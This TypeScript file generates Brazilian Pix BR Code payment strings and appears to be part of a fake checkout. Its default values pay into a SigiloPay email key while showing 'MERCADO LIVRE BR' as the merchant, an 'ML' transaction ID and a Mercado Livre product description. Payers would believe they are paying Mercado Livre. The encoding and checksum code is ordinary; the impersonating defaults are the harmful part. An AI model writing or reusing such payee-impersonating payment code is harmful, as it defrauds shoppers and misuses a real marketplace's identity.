/**
 * Standard Brazilian Pix EMV (BR Code) Generator
 * Conforms to Central Bank of Brazil (BACEN) standards.
 * Used for SigiloPay and Mercado Pago checkout integrations.
 */

function formatField(id: string, value: string): string {
  const len = value.length.toString().padStart(2, '0');
  return `${id}${len}${value}`;
}

function calculateCrc16(payload: string): string {
  let crc = 0xffff;
  const polynomial = 0x1021;

  for (let i = 0; i < payload.length; i++) {
    crc ^= payload.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if ((crc & 0x8000) !== 0) {
        crc = ((crc << 1) ^ polynomial) & 0xffff;
      } else {
        crc = (crc << 1) & 0xffff;
      }
    }
  }

  return (crc & 0xffff).toString(16).toUpperCase().padStart(4, '0');
}

export interface GeneratePixOptions {
  pixKey?: string;
  merchantName?: string;
  merchantCity?: string;
  txId?: string;
  amount?: number;
  description?: string;
}

export function generatePixPayload({
  pixKey = 'contato@sigilopay.com.br',
  merchantName = 'MERCADO LIVRE BR',
  merchantCity = 'SAO PAULO',
  txId = `ML${Math.floor(10000000 + Math.random() * 90000000)}`,
  amount = 29.9,
  description = 'Mercado Livre Dryko Spray',
}: GeneratePixOptions = {}): string {
  // Format clean merchant name (max 25 chars, no accents)
  const cleanName = merchantName
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .toUpperCase()
    .slice(0, 25);

  // Format clean merchant city (max 15 chars, no accents)
  const cleanCity = merchantCity
    .normalize('NFD')
    .replace(/[\u0300-\u036f]/g, '')
    .toUpperCase()
    .slice(0, 15);

  // Merchant Account Info (Tag 26)
  const gui = formatField('00', 'br.gov.bcb.pix');
  const key = formatField('01', pixKey);
  const info = description ? formatField('02', description.slice(0, 40)) : '';
  const merchantAccountInfo = formatField('26', `${gui}${key}${info}`);

  // Additional Data (Tag 62) - TxId
  const cleanTxId = (txId || '***').replace(/[^a-zA-Z0-9]/g, '').slice(0, 25);
  const additionalData = formatField('62', formatField('05', cleanTxId));

  // Build payload without CRC16
  const payloadFormat = formatField('00', '01');
  const pointOfInitiation = formatField('01', '12'); // Dynamic or Static
  const mcc = formatField('52', '0000');
  const currency = formatField('53', '986');
  const formattedAmount = formatField('54', amount.toFixed(2));
  const countryCode = formatField('58', 'BR');
  const nameField = formatField('59', cleanName);
  const cityField = formatField('60', cleanCity);

  const rawPayload = `${payloadFormat}${pointOfInitiation}${merchantAccountInfo}${mcc}${currency}${formattedAmount}${countryCode}${nameField}${cityField}${additionalData}6304`;

  // Calculate CRC16 checksum
  const crc = calculateCrc16(rawPayload);

  return `${rawPayload}${crc}`;
}
